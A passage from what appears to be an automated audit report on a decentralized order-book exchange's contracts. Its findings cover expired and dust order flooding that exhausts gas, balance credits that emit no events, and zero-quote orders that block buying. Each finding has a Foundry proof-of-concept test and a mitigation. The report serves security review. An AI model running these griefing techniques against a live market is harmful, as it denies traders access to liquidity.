A permissionless order flooder can make one side of a market unusable for taker fills and router routes at the best price. Victims cannot consume otherwise valid liquidity behind the expired prefix, and cleanup cannot be batched by third parties, causing functional market DoS rather than direct theft.

## Proof of Concept
1. Attacker posts many valid minimum-size ask orders at the lowest valid ask price with `cancelTimestamp = block.timestamp + 1`. 2. Time advances so those orders expire while staying at the head of the ask book. 3. A live maker posts valid liquidity at the same price behind the expired orders. 4. A victim submits a BUY fill or a GTERouter CLOB_FILL route. 5. `_matchIncomingBid` must remove every expired head order before reaching the live order; with enough expired orders the call runs out of gas and reverts, rolling back all removals. 6. Repeating the victim fill never makes progress, so the side remains blocked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {Side} from "contracts/clob/types/Order.sol";
import {CLOBStorageLib, MarketConfig, MarketSettings} from "contracts/clob/types/Book.sol";

contract AccountManagerMock {
    function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns (uint256) { return 0; }
    function creditAccount(address, address, uint256) external {}
    function creditAccountNoEvent(address, address, uint256) external {}
    function debitAccount(address, address, uint256) external {}
    function getOperatorRoleApprovals(address, address) external pure returns (uint256) { return 0; }
}

contract CLOBHarness is CLOB {
    constructor(address accountManager) CLOB(address(0xbeef), address(0xcafe), accountManager, 1) {}

    function initHarness(address quote, address base) external {
        CLOBStorageLib.init(
            _getStorage(),
            MarketConfig({quoteToken: quote, baseToken: base, quoteSize: 1e18, baseSize: 1e18}),
            MarketSettings({status: true, maxLimitsPerTx: 255, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1})
        );
    }
}

contract ExpiredOrderDoSTest is Test {
    function testExpiredHeadOrdersDoSFillUntilAllAreProcessed() external {
        AccountManagerMock am = new AccountManagerMock();
        CLOBHarness clob = new CLOBHarness(address(am));
        clob.initHarness(address(0x1111), address(0x2222));

        address maker = address(0xA11CE);
        uint256 expiredOrders = 220;

        for (uint96 i = 1; i <= expiredOrders; ++i) {
            ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs({
                amountInBase: 100,
                price: 1e18,
                cancelTimestamp: uint32(block.timestamp + 1),
                side: Side.SELL,
                clientOrderId: i,
                limitOrderType: ICLOB.LimitOrderType.POST_ONLY
            });
            vm.prank(maker);
            clob.postLimitOrder(maker, ask);
        }

        ICLOB.PostLimitOrderArgs memory liveAsk = ICLOB.PostLimitOrderArgs({
            amountInBase: 100,
            price: 1e18,
            cancelTimestamp: 0,
            side: Side.SELL,
            clientOrderId: uint96(expiredOrders + 1),
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        });
        vm.prank(maker);
        clob.postLimitOrder(maker, liveAsk);

        vm.warp(block.timestamp + 2);

        ICLOB.PostFillOrderArgs memory buy = ICLOB.PostFillOrderArgs({
            amount: 100,
            priceLimit: 1e18,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.FILL_OR_KILL
        });

        vm.prank(address(0xB0B));
        (bool ok,) = address(clob).call{gas: 400_000}(abi.encodeCall(ICLOB.postFillOrder, (address(0xB0B), buy)));
        assertEq(ok, false, "bounded-gas fill should fail before reaching live liquidity");
        assertEq(clob.getNumAsks(), expiredOrders + 1, "failed cleanup rolls back and leaves book blocked");

        vm.prank(address(0xB0B));
        clob.postFillOrder(address(0xB0B), buy);
        assertEq(clob.getNumAsks(), 0, "only an unbounded high-gas fill can clear the expired prefix");
    }
}

## Suggested Mitigation
Add a permissionless bounded cleanup function for expired orders and/or cap the number of expired orders removed during a fill with a cursor-based batching mechanism. Do not require a successful trade for expired-order cleanup to persist. Also consider bounding per-price order count or charging/capping expiry cleanup work so a single price level cannot accumulate an unbounded expired prefix.
```

### M-67 / `V7oC8eZirDDRKdSOpU5_S`
- Finding title: Unlimited same-price dust orders can make CLOB fills exceed practical gas limits
- Report lines: 6263-6318
```md
## [M-67]. Unlimited same-price dust orders can make CLOB fills exceed practical gas limits

## id: V7oC8eZirDDRKdSOpU5_S

## Derived From Pattern/Invariant
UnboundedLoops: state-derived iteration in matching/settlement path

## Exploit Type
GasGriefBlockLimit

## Location
CLOB._matchIncomingBid/_matchIncomingAsk

## Finding Status: Valid
### Finding Status Justification: The protocol enforces minLimitOrderAmountInBase, lot size, maxLimitsPerTx, and maxNumLimitsPerSide, but none of these caps total order count at one price. Matching must process same-price FIFO orders in order, and settlement then loops over makerCredits. An attacker can repeatedly post minimum-size orders at the best price, making any meaningful crossing fill process many small orders before reaching deeper liquidity. Gas cost scales with attacker-created state. There is no complete per-price order cap, max maker count, or bounded partial-fill mechanism.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The protocol bounds the number of price levels with maxNumLimitsPerSide and throttles orders per transaction with maxLimitsPerTx, but it does not bound the number of orders inside one price level. Matching must walk the FIFO queue at the best price and then AccountManager loops through every maker credit:

while (bestAskPrice <= incomingOrder.price && incomingOrder.amount > 0) { ... _matchIncomingOrder(...); ... }
for (uint256 i; i < params.makerCredits.length; ++i) { MakerCredit memory credit = params.makerCredits[i]; ... }

An attacker can repeatedly post minimum-size orders at the best price over many transactions. Legitimate takers cannot skip them because price-time priority requires consuming the queue first.

## Impact
A low-cost state-growth attack can make meaningful market orders at the top of book run out of gas or become uneconomical. Legitimate liquidity behind the dust queue is inaccessible until enough dust orders are individually consumed or canceled, degrading market availability without needing privileged access.

## Proof of Concept
1. Market settings allow minLimitOrderAmountInBase == 100 and any normal maxLimitsPerTx.
2. Attacker uses many accounts or transactions to place many 100-base-unit orders at the same best ask price.
3. A legitimate buyer submits a marketable fill large enough to reach real liquidity behind the dust.
4. _matchIncomingBid must process every dust order in FIFO order and settlement materializes one maker credit per maker.
5. Gas scales with attacker-created order count and eventually exceeds practical transaction gas, blocking fills through that price level.

## Proof of Code
pragma solidity 0.8.27;
import 'forge-std/Test.sol';
import {CLOB} from 'contracts/clob/CLOB.sol';
import {ICLOB, Side} from 'contracts/clob/ICLOB.sol';
import {MarketConfig, MarketSettings} from 'contracts/clob/types/Book.sol';
import {BeaconProxy} from '@openzeppelin/proxy/beacon/BeaconProxy.sol';
import {UpgradeableBeacon} from '@openzeppelin/proxy/beacon/UpgradeableBeacon.sol';

contract MockFactory { function getMaxLimitExempt(address) external pure returns (bool) { return false; } }
contract MockAccountManager { uint256 public lastMakerCredits; function settleIncomingOrder(ICLOB.SettleParams calldata params) external returns (uint256) { lastMakerCredits = params.makerCredits.length; return 0; } function creditAccount(address,address,uint256) external {} function creditAccountNoEvent(address,address,uint256) external {} function debitAccount(address,address,uint256) external {} }

contract CLOBGasPoC is Test { MockAccountManager internal am; function _deploy() internal returns (CLOB market) { MockFactory factory = new MockFactory(); am = new MockAccountManager(); CLOB impl = new CLOB(address(factory), address(0), address(am), 1000); UpgradeableBeacon beacon = new UpgradeableBeacon(address(impl), address(this)); bytes memory init = abi.encodeWithSelector(CLOB.initialize.selector, MarketConfig({quoteToken: address(0x100), baseToken: address(0x200), quoteSize: 1e18, baseSize: 1e18}), MarketSettings({status: true, maxLimitsPerTx: type(uint8).max, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1}), address(this)); market = CLOB(address(new BeaconProxy(address(beacon), init))); } function _postSell(CLOB market, address user, uint256 amount) internal { vm.prank(user); market.postLimitOrder(user, ICLOB.PostLimitOrderArgs({amountInBase: amount, price: 1e18, cancelTimestamp: 0, side: Side.SELL, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.POST_ONLY})); } function _fillBuy(CLOB market, address user, uint256 amount) internal returns (uint256 gasUsed) { uint256 gasBefore = gasleft(); vm.prank(user); market.postFillOrder(user, ICLOB.PostFillOrderArgs({amount: amount, priceLimit: 1e18, side: Side.BUY, amountIsBase: true, fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL})); gasUsed = gasBefore - gasleft(); } function testSamePriceOrderCountDrivesFillGas() public { CLOB one = _deploy(); _postSell(one, address(0x1001), 100); uint256 gasOne = _fillBuy(one, address(0xBEEF), 100); CLOB many = _deploy(); for (uint256 i; i < 200; ++i) { _postSell(many, address(uint160(0x2000 + i)), 100); } uint256 gasMany = _fillBuy(many, address(0xCAFE), 20_000); assertEq(am.lastMakerCredits(), 200); assertGt(gasMany, gasOne * 5); } }


## Suggested Mitigation
Add a per-price-level order cap, enforce a minimum notional large enough to make flooding expensive, and/or add a max match count parameter so fills can stop and return partial progress before exceeding gas. Settlement should also be batched or bounded by a caller-provided maximum maker count.
```

### L-70 / `MQILBNE2yqCT59JTgYiZQ`
- Finding title: creditAccountNoEvent updates AccountManager balances without AccountCredited events, desynchronizing event-based accounting
- Report lines: 6550-6633
```md
## [L-70]. creditAccountNoEvent updates AccountManager balances without AccountCredited events, desynchronizing event-based accounting

## id: MQILBNE2yqCT59JTgYiZQ

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
AccountManager.creditAccountNoEvent

## Finding Status: InvalidByDesign
### Finding Status Justification: The code exactly exposes creditAccountNoEvent onlyMarket, and _creditAccountNoEvent mutates accountTokenBalances without emitting AccountCredited or incrementing EventNonce. CLOB also uses creditAccountNoEvent for non-competitive order removal and AccountManager.settleIncomingOrder uses _creditAccountNoEvent for maker credits. There is no alternate balance-adjustment event in those paths. The function comments explicitly say it credits without event, so the no-event behavior is intentional, but the risk of event-only indexer divergence is not fully guarded. It is in scoped production code and can occur through normal registered-market settlement/removal paths without privileged abuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
AccountManager intentionally exposes a market-only credit path that mutates the internal balance ledger without emitting AccountCredited or incrementing the shared event nonce. CLOB settlement uses the same no-event path for maker credits in settleIncomingOrder. Any off-chain service that reconstructs balances from AccountDebited, AccountCredited, FeesAccrued, and related event nonces will miss these credits and build a state lower than on-chain storage.

Vulnerable snippets:
`function creditAccountNoEvent(address account, address token, uint256 amount) external virtual onlyMarket { _creditAccountNoEvent(_getAccountStorage(), account, token, amount); }`

`function _creditAccountNoEvent(...) internal { unchecked { self.accountTokenBalances[account][token] += amount; } }`

## Impact
Event-driven bots, indexers, and frontends can show stale or understated maker balances after fills, expiries, or non-competitive order removals. This can cause missed withdrawals or incorrect trading decisions, but on-chain balances remain correct, so direct asset theft is not established.

## Proof of Concept
1. A maker receives settlement credit through a registered CLOB path that calls creditAccountNoEvent or settleIncomingOrder maker credits. 2. AccountManager increases accountTokenBalances[maker][token]. 3. No AccountCredited event is emitted and the event nonce does not advance for that balance mutation. 4. An off-chain indexer replaying AccountManager events observes no credit and reconstructs a lower maker balance than storage. 5. Bots or UI workflows relying on the reconstructed balance make incorrect decisions until they query storage directly.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {AccountManager} from "contracts/account-manager/AccountManager.sol";

contract AccountManagerNoEventCreditPoC is Test {
    AccountManager accountManager;
    address router = address(0x1111);
    address clobManager = address(this);
    address market = address(0xBEEF);
    address maker = address(0xCAFE);
    address token = address(0xF00D);

    event AccountCredited(uint256 indexed eventNonce, address indexed account, address indexed token, uint256 amount);

    function setUp() public {
        uint16[] memory makerFees = new uint16[](3);
        uint16[] memory takerFees = new uint16[](3);
        accountManager = new AccountManager(router, clobManager, makerFees, takerFees);
        accountManager.initialize(address(this));
        accountManager.registerMarket(market);
    }

    function test_creditAccountNoEventChangesStorageWithoutEventNonce() public {
        uint256 nonceBefore = accountManager.getEventNonce();

        vm.recordLogs();
        vm.prank(market);
        accountManager.creditAccountNoEvent(maker, token, 100 ether);
        Vm.Log[] memory logs = vm.getRecordedLogs();

        assertEq(accountManager.getAccountBalance(maker, token), 100 ether);
        assertEq(accountManager.getEventNonce(), nonceBefore);

        bytes32 creditedSig = keccak256("AccountCredited(uint256,address,address,uint256)");
        for (uint256 i; i < logs.length; ++i) {
            assertTrue(logs[i].topics[0] != creditedSig);
        }
    }
}

## Suggested Mitigation
Emit AccountCredited for every balance increase, including maker-credit aggregation and non-competitive refunds, or add a distinct BalanceAdjusted event with the shared event nonce so off-chain accounting can reconstruct storage exactly.





Finding Status: InvalidERC20EdgeCase
```

### M-72 / `2F-o7dt6Wwd3vQcFKEZQf`
- Finding title: Manager setting updates can admit zero-quote orders that brick one side of a CLOB market
- Report lines: 6740-6836
```md
## [M-72]. Manager setting updates can admit zero-quote orders that brick one side of a CLOB market

## id: 2F-o7dt6Wwd3vQcFKEZQf

## Derived From Pattern/Invariant
PricePrecisionOrRoundingError

## Exploit Type
Dos

## Location
CLOBManager.setTickSizes/setMinLimitOrderAmounts

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: Once a privileged setter creates the unsafe tick/min-order combination, an unprivileged trader can post the zero-quote ask and block matching; therefore the resulting state is permissionlessly exploitable, even though entering that state depends on a trusted role setting unsafe parameters.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
`createMarket()` rejects settings where the minimum order at the tick size rounds to zero quote: `if (settings.tickSize.fullMulDiv(settings.minLimitOrderAmountInBase, baseSize) == 0) revert InvalidSettings();`. The later manager setters do not preserve that invariant: `setTickSizes()` forwards any nonzero tick to `CLOB.setTickSize()`, and `setMinLimitOrderAmounts()` only enforces the hard minimum. After a valid role sets `tickSize * minLimitOrderAmountInBase < baseSize`, a permissionless trader can post a best ask whose quote value is zero. Matching a buy against it computes `baseDelta > 0` and `quoteDelta == 0`, then reverts as `ZeroCostTrade`; because the order remains best ask, all crossing buys revert until the attacker cancels.

## Impact
A valid CLOB settings update can make a market permissionlessly griefable. An attacker locks only the minimum base amount at the minimum price and blocks buy-side matching for that market, disrupting trading and settlement availability.

## Proof of Concept
1. A market is created with valid initial settings satisfying `tickSize * minLimitOrderAmountInBase / baseSize > 0`.
2. The tick-size role calls `CLOBManager.setTickSizes()` with `tickSize = 1`, or the min-order role lowers the minimum so the product rounds to zero.
3. The attacker deposits the base token and posts an ask at `price = 1` for the minimum amount.
4. The order is accepted because ask posting only locks base and does not require a nonzero quote value.
5. Any buyer crossing the best ask hits `quoteDelta == 0` and `baseDelta > 0`; `postFillOrder()` or a crossing bid reverts with `ZeroCostTrade`, leaving the grief order in place.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Book, BookLib, CLOBStorageLib, MarketConfig, MarketSettings, Limit} from "contracts/clob/types/Book.sol";
import {Order, OrderIdLib, Side} from "contracts/clob/types/Order.sol";

contract BookHarness {
    Book internal book;

    function init(uint256 baseSize, uint256 tick, uint256 minAmount, uint256 lot) external {
        CLOBStorageLib.init(
            book,
            MarketConfig(address(uint160(0xA)), address(uint160(0xB)), 1e18, baseSize),
            MarketSettings(true, 10, minAmount, tick, lot)
        );
    }

    function setTick(uint256 tick) external { BookLib.setTickSize(book, tick); }

    function assertAccepted(uint256 price, uint256 amount) external view {
        BookLib.assertLimitPriceInBounds(book, price);
        BookLib.assertLimitOrderAmountInBounds(book, amount);
        BookLib.assertLotSizeCompliant(book, amount);
    }

    function addAsk(uint256 id, uint256 price, uint256 amount, address owner) external {
        Order memory o;
        o.side = Side.SELL;
        o.id = OrderIdLib.toOrderId(id);
        o.owner = owner;
        o.price = price;
        o.amount = amount;
        BookLib.addOrderToBook(book, o);
    }

    function quote(uint256 price, uint256 amount) external view returns (uint256) {
        return BookLib.getQuoteTokenAmount(book, price, amount);
    }

    function getLimit(uint256 price) external view returns (uint64 n, uint256 head, uint256 tail) {
        Limit storage l = BookLib.getLimit(book, price, Side.SELL);
        return (l.numOrders, OrderIdLib.unwrap(l.headOrder), OrderIdLib.unwrap(l.tailOrder));
    }
}

contract ZeroQuoteTickPoC is Test {
    function testManagerAcceptedTickAllowsZeroQuoteBestAsk() external {
        BookHarness h = new BookHarness();
        h.init(1e18, 1e18, 100, 1);
        h.setTick(1);
        h.assertAccepted(1, 100);
        h.addAsk(1, 1, 100, address(uint160(0xCAFE)));
        assertEq(h.quote(1, 100), 0);
        (uint64 n, uint256 head,) = h.getLimit(1);
        assertEq(uint256(n), 1);
        assertEq(head, 1);
    }
}

## Suggested Mitigation
Apply the same nonzero notional invariant in every settings update that can change tick size or minimum order amount. For example, `newTickSize.fullMulDiv(currentMinLimitOrderAmountInBase, baseSize) > 0` and `currentTickSize.fullMulDiv(newMinLimitOrderAmountInBase, baseSize) > 0`. Also reject posting any order whose locked or matched quote/base amount rounds to zero.
```
